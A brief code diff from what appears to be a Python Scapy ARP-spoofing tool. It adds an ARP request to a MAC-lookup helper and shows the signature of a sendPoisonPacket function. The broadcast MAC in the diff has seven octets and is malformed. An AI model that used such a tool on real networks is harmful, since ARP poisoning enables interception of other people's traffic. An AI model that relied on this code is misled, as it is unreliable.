@@ -7,7 +7,7 @@ def getOwnMacIP(iface):
     return ipOwn, macOwn
 
 def getMacAddress(ipAdd, iface):
-    packet = Ether(dst="ff:ff:ff:ff:ff:ff:ff")
+    packet = Ether(dst="ff:ff:ff:ff:ff:ff:ff")/ARP(pdst=ipAdd)
     received = srp(packet, iface=iface, timeout=2)
 
 def sendPoisonPacket(ipAttacker, macAttacker, ipTarget, macTarget, ipToSpoof):
